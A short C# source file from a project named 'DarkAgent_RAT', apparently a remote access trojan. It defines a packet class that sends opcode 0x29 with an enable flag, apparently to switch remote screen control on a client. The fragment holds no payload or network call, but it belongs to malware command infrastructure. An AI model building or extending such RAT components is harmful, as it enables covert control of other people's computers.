using System;
using System.Collections.Generic;
using System.Text;

namespace DarkAgent_RAT.src.Network.DataNetwork.Packets.Send
{
    class S_RemoteControlScreen : SendBasePacket
    {
        byte enable;
        public S_RemoteControlScreen(RatClients client, byte enable)
            : base(client)
        {
            this.enable = enable;
        }

        protected internal override void Write()
        {
            WriteByte(0x29);
            WriteByte(enable);
        }
    }
}